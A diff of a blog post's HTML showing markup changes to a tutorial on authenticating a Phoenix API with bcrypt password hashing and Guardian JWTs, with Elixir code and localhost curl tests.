@@ -3,6 +3,7 @@
 <head>
   <meta charset="utf-8"/>
   <meta http-equiv='X-UA-Compatible' content='IE=edge;chrome=1'/>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Hostile Developer - Guard this with your life... Or authenticating APIs with Guardian</title>
   <link href="/stylesheets/application.css" rel="stylesheet" type="text/css" />
   <link rel="alternate" type="application/atom+xml" title="Atom Feed" href="/feed.xml" />
@@ -12,23 +13,17 @@
   <section id="header">
   <header>
 <a href="/">        <h1 class="brand"><span class="hostile">Hostile</span> Developer</h1>
-
-        <h3 class="tag-line">I am Steven. Hear me Rant.</h3>
+        <h4 class="tag-line">I am Steven. Hear me Rant.</h4>
 </a>  </header>
 
   <section class='social'>
     <a target="_blank" href="http://twitter.com/_StevenNunez/"><i class="fa fa-twitter"></i></a>
     <a target="_blank" href="https://github.com/StevenNunez/"><i class="fa fa-github"></i></a>
   </section>
-  <nav>
-    <ul class='links'>
-      <li><a href="/">Home</a></li>
-    </ul>
-  </nav>
 </section>
 
 
-  <main id='articles' role="main">
+  <main id='article' role="main">
     <h1 class="article-title"><a href="/2016/05/23/guard-this-with-your-life-or-authenticating-apis-with-guardian.html">Guard this with your life... Or authenticating APIs with Guardian</a></h1>
     <h1>Authentication in Phoenix</h1>
 
@@ -62,7 +57,7 @@
 <p>Run <code>mix phoenix.gen.model Account accounts email password_digest</code> then <code>mix ecto.migrate</code>.</p>
 
 <p>Open the new model, and update the schema to have a virtual attribute:</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -76,8 +71,7 @@
 
   <span class="n">timestamps</span>
 <span class="k">end</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Virtual attributes are a great way of taking a value from an interaction, but not persisting. In our case, we&rsquo;ll be using it to hold the value a users gives us before we hash and persist it.</p>
 
 <h1>Changesets</h1>
@@ -89,24 +83,23 @@
 <p>Creating a changeset is easy. In the model, we call <code>cast</code> and pass in the model, a map with proposed values, and the fields we require, and permit.</p>
 
 <p>This is the built in one from our project. Be sure to change the <code>password_digest</code> in our <code>@required_fields</code> to <code>password</code>. The user will never pass us a <code>password_digest</code></p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
 5
 6
 7
-</pre></td><td class="rouge-code"><pre><span class="nv">@required_fields</span> <span class="err">~</span><span class="n">w</span><span class="p">(</span><span class="n">email</span> <span class="n">password</span><span class="p">)</span> <span class="c1"># &lt;- Changed from password_digest to password</span>
-<span class="nv">@optional_fields</span> <span class="err">~</span><span class="n">w</span><span class="p">()</span>
+</pre></td><td class="rouge-code"><pre><span class="nv">@required_fields</span> <span class="sx">~w(email password)</span> <span class="c1"># &lt;- Changed from password_digest to password</span>
+<span class="nv">@optional_fields</span> <span class="sx">~w()</span>
 
 <span class="k">def</span> <span class="n">changeset</span><span class="p">(</span><span class="n">model</span><span class="p">,</span> <span class="n">params</span> <span class="p">\\</span> <span class="ss">:empty</span><span class="p">)</span> <span class="k">do</span>
   <span class="n">model</span>
   <span class="o">|&gt;</span> <span class="n">cast</span><span class="p">(</span><span class="n">params</span><span class="p">,</span> <span class="nv">@required_fields</span><span class="p">,</span> <span class="nv">@optional_fields</span><span class="p">)</span>
 <span class="k">end</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>This returns a changeset back. We can tag along another function, as long as it returns a changeset as well. Let&rsquo;s do some work to obfuscate the user&rsquo;s password.</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -126,17 +119,15 @@
   <span class="n">password</span> <span class="o">=</span> <span class="n">changeset</span><span class="o">.</span><span class="n">changes</span><span class="o">.</span><span class="n">password</span>
   <span class="n">put_change</span><span class="p">(</span><span class="n">changeset</span><span class="p">,</span> <span class="ss">:password_digest</span><span class="p">,</span> <span class="no">String</span><span class="o">.</span><span class="n">reverse</span><span class="p">(</span><span class="n">password</span><span class="p">))</span>
 <span class="k">end</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Open up <code>iex -S mix</code> and try this out:</p>
-<pre class="highlight plaintext"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight plaintext"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 </pre></td><td class="rouge-code"><pre>iex&gt; alias ArticleTrackerHd.Account
 iex&gt; changeset = Account.changeset(%Account{}, %{email: "steven@example.com", password: "beef101"})
 iex&gt; changeset.changes.password_digest # =&gt; "101feeb"
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>#security #hashtag. I think we need to be a bit more deliberate in our approach.</p>
 
 <h1>Come on in!</h1>
@@ -144,7 +135,7 @@ iex&gt; changeset.changes.password_digest # =&gt; "101feeb"
 <p>Maybe not what you want to hear in a security library, but, hey&hellip; We&rsquo;ll be adding this library to handle our password hashing.</p>
 
 <p>Checkout their <a href="https://github.com/elixircnx/comeonin">github</a> and add the latest version to your <code>mix.exs</code> file.</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -168,10 +159,9 @@ iex&gt; changeset.changes.password_digest # =&gt; "101feeb"
 <span class="k">end</span>
 
 
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Then start the application:</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -199,14 +189,13 @@ iex&gt; changeset.changes.password_digest # =&gt; "101feeb"
     <span class="p">]</span>
   <span class="p">]</span>
 <span class="k">end</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p><code>mix deps.get</code> and we&rsquo;re good to go.</p>
 
 <h3>Updating our changeset</h3>
 
 <p>Let&rsquo;s update to our super secure hashing algorithm.</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -214,10 +203,9 @@ iex&gt; changeset.changes.password_digest # =&gt; "101feeb"
   <span class="n">password</span> <span class="o">=</span> <span class="n">changeset</span><span class="o">.</span><span class="n">changes</span><span class="o">.</span><span class="n">password</span>
   <span class="n">put_change</span><span class="p">(</span><span class="n">changeset</span><span class="p">,</span> <span class="ss">:password_digest</span><span class="p">,</span> <span class="no">Comeonin</span><span class="o">.</span><span class="no">Bcrypt</span><span class="o">.</span><span class="n">hashpwsalt</span><span class="p">(</span><span class="n">password</span><span class="p">))</span>
 <span class="k">end</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Open up <code>iex -S mix</code> and try again:</p>
-<pre class="highlight plaintext"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight plaintext"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -225,8 +213,7 @@ iex&gt; changeset.changes.password_digest # =&gt; "101feeb"
 iex&gt; changeset = Account.changeset(%Account{}, %{email: "steven@example.com", password: "beef101"})
 iex&gt; changeset.changes.password_digest # =&gt; "Something crazy"
 iex&gt; Repo.insert!(changeset)
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>WIN! We&rsquo;re doing right by our users. Note that we saved user with an email of <code>steven@example.com</code> and a password of <code>beef101</code>.</p>
 
 <h3>Authenticating users</h3>
@@ -235,15 +222,13 @@ iex&gt; Repo.insert!(changeset)
 <img alt="getinsertpic.com" src="https://media3.giphy.com/media/ZvRz1cnhjyecw/200.gif" /></p>
 
 <p>In Phoenix, we create &ldquo;pure&rdquo; function in our models and views, and &ldquo;impure&rdquo; functions&hellip; elsewhere. What is a &ldquo;pure&rdquo; function? Think of a function that takes in 2 values</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 </pre></td><td class="rouge-code"><pre><span class="k">fn</span> <span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span> <span class="k">end</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>If you call this function with 1 and 2, the result will always be the same. Now imagine calling this code:</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 </pre></td><td class="rouge-code"><pre><span class="no">Repo</span><span class="o">.</span><span class="n">all</span><span class="p">(</span><span class="no">Account</span><span class="p">)</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>This code might return 1 User, or 300. We&rsquo;re touching the outside world. Fancy terms for simple things.</p>
 
 <p>Back to authentication. We need a place to handle our impure operations. I&rsquo;m coining a new term, We need a <em>Service Module</em></p>
@@ -251,7 +236,7 @@ iex&gt; Repo.insert!(changeset)
 <p><img alt="getinsertpic.com" src="http://media0.giphy.com/media/GsYaDdbX7k3Kw/200.gif" /></p>
 
 <p>This module will hold our impure auth related stuff. Make a new file in <code>web/services</code> called <code>auth.ex</code>.</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -285,10 +270,9 @@ iex&gt; Repo.insert!(changeset)
     <span class="k">end</span>
   <span class="k">end</span>
 <span class="k">end</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>So IMPURE! We have one nugget of purity and that&rsquo;s in the <code>find_by_email</code> function. That will return the query we&rsquo;ll pass to <code>Repo.one</code>. Here it is:</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -296,10 +280,9 @@ iex&gt; Repo.insert!(changeset)
   <span class="n">from</span> <span class="n">a</span> <span class="ow">in</span> <span class="bp">__MODULE__</span><span class="p">,</span>
   <span class="ss">where:</span> <span class="n">a</span><span class="o">.</span><span class="n">email</span> <span class="o">==</span> <span class="o">^</span><span class="n">email</span>
 <span class="k">end</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Try it out. <code>iex -S mix</code>.</p>
-<pre class="highlight plaintext"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight plaintext"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -323,8 +306,7 @@ iex&gt; Auth.verify("steven@example.com", "wrongpw")
 {:error, :bad_password}
 iex&gt; Auth.verify("nope@example.com", "wrongpw")  
 {:error, :not_found}
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>GLORIOUS!!</p>
 
 <h1>Guardian</h1>
@@ -336,7 +318,7 @@ iex&gt; Auth.verify("nope@example.com", "wrongpw")
 <p>Let&rsquo;s set it up. You&rsquo;ll need a key for the next part. Run <code>mix phoenix.gen.secret</code> and hold on to the value.</p>
 
 <p>Open up <code>mix.exs</code>:</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -358,12 +340,11 @@ iex&gt; Auth.verify("nope@example.com", "wrongpw")
    <span class="p">{</span><span class="ss">:guardian</span><span class="p">,</span> <span class="sd">"</span><span class="s2">~&gt; 0.10.0"</span><span class="p">},</span> <span class="c1"># &lt;- New line</span>
    <span class="p">{</span><span class="ss">:cowboy</span><span class="p">,</span> <span class="sd">"</span><span class="s2">~&gt; 1.0"</span><span class="p">}]</span>
 <span class="k">end</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Run <code>mix deps.get</code> to get setup.</p>
 
 <p>We&rsquo;ll need to create a configuration for Guardian in our <code>config.exs</code>.</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -373,8 +354,7 @@ iex&gt; Auth.verify("nope@example.com", "wrongpw")
   <span class="ss">ttl:</span> <span class="p">{</span> <span class="m">30</span><span class="p">,</span> <span class="ss">:days</span> <span class="p">},</span>
   <span class="ss">secret_key:</span> <span class="sd">"</span><span class="s2">46l5yfRFGorxAArf64nGzHlfvSDAOUEV7m6c3/lf4LzZcBfUClDsSfNETrosmsdO"</span><span class="p">,</span> <span class="c1"># &lt;- Your Key</span>
   <span class="ss">serializer:</span> <span class="no">ArticleTrackerHd</span><span class="o">.</span><span class="no">GuardianSerializer</span> <span class="c1"># &lt;- We'll create this next</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>OK, so a bunch of stuff is about to happen&hellip; Brace yourself.</p>
 
 <p><img alt="getinsertpic.com" src="http://media3.giphy.com/media/psK7tSNSAE8Te/200.gif" /></p>
@@ -382,7 +362,7 @@ iex&gt; Auth.verify("nope@example.com", "wrongpw")
 <p>We&rsquo;re going to add 2 plugs. One to teach Guardian how to find our token, and another that lets us convert the token to an account.</p>
 
 <p>Open up your router and add:</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -392,14 +372,13 @@ iex&gt; Auth.verify("nope@example.com", "wrongpw")
   <span class="n">plug</span> <span class="no">Guardian</span><span class="o">.</span><span class="no">Plug</span><span class="o">.</span><span class="no">VerifyHeader</span><span class="p">,</span> <span class="ss">realm:</span> <span class="sd">"</span><span class="s2">Bearer"</span> <span class="c1"># &lt;- New line (1)</span>
   <span class="n">plug</span> <span class="no">Guardian</span><span class="o">.</span><span class="no">Plug</span><span class="o">.</span><span class="no">LoadResource</span>                  <span class="c1"># &lt;- New line (2)</span>
 <span class="k">end</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>The first line tells Guardian to look in the header for <code>Authorization: Bearer some_crazy_token</code>. If you didn&rsquo;t provide a realm, it would expect <code>Authorization: some_crazy_token</code>.</p>
 
 <p>The second line works in tandem with the <em>not yet written</em> <code>ArticleTrackerHd.GuardianSerializer</code> to convert a token value into a record.</p>
 
 <p>Let&rsquo;s go write that serializer. Create a file in <code>web/serializers</code> named <code>guardian_serializer.ex</code></p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -423,8 +402,7 @@ iex&gt; Auth.verify("nope@example.com", "wrongpw")
   <span class="k">def</span> <span class="n">from_token</span><span class="p">(</span><span class="sd">"</span><span class="s2">Account:"</span> <span class="o">&lt;&gt;</span> <span class="n">id</span><span class="p">),</span> <span class="k">do</span><span class="p">:</span> <span class="p">{</span> <span class="ss">:ok</span><span class="p">,</span> <span class="no">Repo</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="no">Account</span><span class="p">,</span> <span class="n">id</span><span class="p">)</span> <span class="p">}</span>
   <span class="k">def</span> <span class="n">from_token</span><span class="p">(</span><span class="n">_</span><span class="p">),</span> <span class="k">do</span><span class="p">:</span> <span class="p">{</span> <span class="ss">:error</span><span class="p">,</span> <span class="sd">"</span><span class="s2">Unknown resource type"</span> <span class="p">}</span>
 <span class="k">end</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Nothing too crazy here. If you find a claim in the token like <code>Account:1</code>, find account with an id of 1.</p>
 
 <p>That&rsquo;s it for Guardian Setup!</p>
@@ -436,7 +414,7 @@ iex&gt; Auth.verify("nope@example.com", "wrongpw")
 <p>Let&rsquo;s tie this all together. We&rsquo;ll create a <code>SessionController</code> with a <code>create</code> action. It will check if the username and password are valid and if it is, we&rsquo;ll sign them in.</p>
 
 <p>Modify your router:</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -446,10 +424,9 @@ iex&gt; Auth.verify("nope@example.com", "wrongpw")
   <span class="n">resources</span> <span class="sd">"</span><span class="s2">/articles"</span><span class="p">,</span> <span class="no">ArticleController</span><span class="p">,</span> <span class="ss">except:</span> <span class="p">[</span><span class="ss">:new</span><span class="p">,</span> <span class="ss">:edit</span><span class="p">]</span>
   <span class="n">post</span> <span class="sd">"</span><span class="s2">/log-in"</span><span class="p">,</span> <span class="no">SessionController</span><span class="p">,</span> <span class="ss">:create</span> <span class="c1"># &lt;- New line</span>
 <span class="k">end</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Then make a file in <code>web/controllers/</code> named <code>session_controller.ex</code>.</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -505,10 +482,9 @@ iex&gt; Auth.verify("nope@example.com", "wrongpw")
   <span class="k">end</span>
 <span class="k">end</span>
 
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Create a file named <code>session_view.ex</code> in <code>web/views/</code>:</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -522,8 +498,7 @@ iex&gt; Auth.verify("nope@example.com", "wrongpw")
     <span class="p">%{</span> <span class="ss">jwt:</span> <span class="n">jwt</span> <span class="p">}</span>
   <span class="k">end</span>
 <span class="k">end</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>The important parts are are numbered.</p>
 
 <ol>
@@ -533,12 +508,11 @@ iex&gt; Auth.verify("nope@example.com", "wrongpw")
 </ol>
 
 <p>Let&rsquo;s test it out!</p>
-<pre class="highlight shell"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight shell"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
-</pre></td><td class="rouge-code"><pre>curl --data <span class="s2">"account[email]=steven@example.com&amp;account[password]=beef101"</span> http://localhost:4000/api/log-in
+</pre></td><td class="rouge-code"><pre>curl <span class="nt">--data</span> <span class="s2">"account[email]=steven@example.com&amp;account[password]=beef101"</span> http://localhost:4000/api/log-in
 <span class="c"># {"jwt":"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJBY2NvdW50OjEiLCJleHAiOjE0NjY2NTQxMzUsImlhdCI6MTQ2NDA2MjEzNSwiaXNzIjoiQXJ0aWNsZVRyYWNrZXJIZCIsImp0aSI6IjhlOTE2ZjQ2LWM5MmEtNDBhMi1iYzE0LTY3Y2VjMmEyYzI1OSIsInBlbSI6e30sInN1YiI6IkFjY291bnQ6MSIsInR5cCI6InRva2VuIn0.OXK_Hu6uJRo3QClBdY05_xFuUdXK2NS3oTCRNZFd6yhyyl-ub1bjBZQV-flM3J6i7WIh1QUvTV4L7I6x72VADA"}</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>WOOOOOOOOT! Now we just need to make a request with that token, and we should be good to go.</p>
 
 <h2>User Autorization</h2>
@@ -546,7 +520,7 @@ iex&gt; Auth.verify("nope@example.com", "wrongpw")
 <p>So we&rsquo;re logged in. Now we want to restrict creating new articles to logged in users, but we want all users to be able to see them.</p>
 
 <p>Open up the <code>ArticleTrackerHd.ArticleController</code>.</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -564,12 +538,11 @@ iex&gt; Auth.verify("nope@example.com", "wrongpw")
   <span class="n">plug</span> <span class="ss">:scrub_params</span><span class="p">,</span> <span class="sd">"</span><span class="s2">article"</span> <span class="ow">when</span> <span class="n">action</span> <span class="ow">in</span> <span class="p">[</span><span class="ss">:create</span><span class="p">,</span> <span class="ss">:update</span><span class="p">]</span>
 <span class="c1">#...</span>
 <span class="k">end</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>This line makes it so only authenticated users can create articles. We&rsquo;ll have to create a new controller for handling guardian errors. If it fails authentication, it will call the <code>unauthenticated</code> function in the module you give it.</p>
 
 <p>Put this in <code>web/controllers/guardian_error_handler</code>:</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -589,10 +562,9 @@ iex&gt; Auth.verify("nope@example.com", "wrongpw")
       <span class="o">|&gt;</span> <span class="n">render</span><span class="p">(</span><span class="no">GuardianErrorView</span><span class="p">,</span> <span class="ss">:forbidden</span><span class="p">)</span>
     <span class="k">end</span>
 <span class="k">end</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>If it fails we want to render a view that returns a JSON message of forbidden. Make a new file in <code>web/views</code> named <code>guardian_error_view.ex</code>:</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -604,10 +576,9 @@ iex&gt; Auth.verify("nope@example.com", "wrongpw")
     <span class="p">%{</span><span class="ss">message:</span> <span class="sd">"</span><span class="s2">Forbidden"</span><span class="p">}</span>
   <span class="k">end</span>
 <span class="k">end</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Let&rsquo;s try this out, then get a beer.</p>
-<pre class="highlight shell"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight shell"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -615,16 +586,15 @@ iex&gt; Auth.verify("nope@example.com", "wrongpw")
 6
 7
 8
-</pre></td><td class="rouge-code"><pre>curl --data <span class="s2">"account[email]=steven@example.com&amp;account[password]=beef101"</span> http://localhost:4000/api/log-in
+</pre></td><td class="rouge-code"><pre>curl <span class="nt">--data</span> <span class="s2">"account[email]=steven@example.com&amp;account[password]=beef101"</span> http://localhost:4000/api/log-in
 <span class="c"># {"jwt":"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJBY2NvdW50OjEiLCJleHAiOjE0NjY2NTQ2NzUsImlhdCI6MTQ2NDA2MjY3NSwiaXNzIjoiQXJ0aWNsZVRyYWNrZXJIZCIsImp0aSI6IjBjZDNiYWZhLTY4MjYtNGJlNi1hYWM3LTMzZWJkNTAwMzM5NyIsInBlbSI6e30sInN1YiI6IkFjY291bnQ6MSIsInR5cCI6InRva2VuIn0.S3jQkmtia-mlAv0O0u1QZxWr3MFH5IBnG1C_u0Uyjq6-DOA5is3l8tKiI0M83Vfw5ADUi55uXfoRqYRY7EQ-DQ"}</span>
 curl http://localhost:4000/api/articles
 <span class="c"># all the articles</span>
-curl --data <span class="s2">"article[url]=http://example.com&amp;article[title]=A+Great+one&amp;article[categories]=foo.bar.baz"</span> http://localhost:4000/api/articles
+curl <span class="nt">--data</span> <span class="s2">"article[url]=http://example.com&amp;article[title]=A+Great+one&amp;article[categories]=foo.bar.baz"</span> http://localhost:4000/api/articles
 <span class="c"># Forbidden</span>
-curl --data <span class="s2">"article[url]=http://example.com&amp;article[title]=A+Great+one&amp;article[categories]=foo.bar.baz"</span> http://localhost:4000/api/articles --header <span class="s2">"Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJBY2NvdW50OjEiLCJleHAiOjE0NjY2NTQ2NzUsImlhdCI6MTQ2NDA2MjY3NSwiaXNzIjoiQXJ0aWNsZVRyYWNrZXJIZCIsImp0aSI6IjBjZDNiYWZhLTY4MjYtNGJlNi1hYWM3LTMzZWJkNTAwMzM5NyIsInBlbSI6e30sInN1YiI6IkFjY291bnQ6MSIsInR5cCI6InRva2VuIn0.S3jQkmtia-mlAv0O0u1QZxWr3MFH5IBnG1C_u0Uyjq6-DOA5is3l8tKiI0M83Vfw5ADUi55uXfoRqYRY7EQ-DQ"</span>
+curl <span class="nt">--data</span> <span class="s2">"article[url]=http://example.com&amp;article[title]=A+Great+one&amp;article[categories]=foo.bar.baz"</span> http://localhost:4000/api/articles <span class="nt">--header</span> <span class="s2">"Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJBY2NvdW50OjEiLCJleHAiOjE0NjY2NTQ2NzUsImlhdCI6MTQ2NDA2MjY3NSwiaXNzIjoiQXJ0aWNsZVRyYWNrZXJIZCIsImp0aSI6IjBjZDNiYWZhLTY4MjYtNGJlNi1hYWM3LTMzZWJkNTAwMzM5NyIsInBlbSI6e30sInN1YiI6IkFjY291bnQ6MSIsInR5cCI6InRva2VuIn0.S3jQkmtia-mlAv0O0u1QZxWr3MFH5IBnG1C_u0Uyjq6-DOA5is3l8tKiI0M83Vfw5ADUi55uXfoRqYRY7EQ-DQ"</span>
 curl http://localhost:4000/api/articles
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>VICTORY!</p>
 
 <h2>Quick associations</h2>
@@ -634,7 +604,7 @@ curl http://localhost:4000/api/articles
 <p>Run <code>mix ecto.gen.migration add_account_reference_to_article</code></p>
 
 <p>Then modify it to say:</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -652,11 +622,10 @@ curl http://localhost:4000/api/articles
     <span class="k">end</span>
   <span class="k">end</span>
 <span class="k">end</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Wire up the models:
 In <code>article.ex</code>:</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
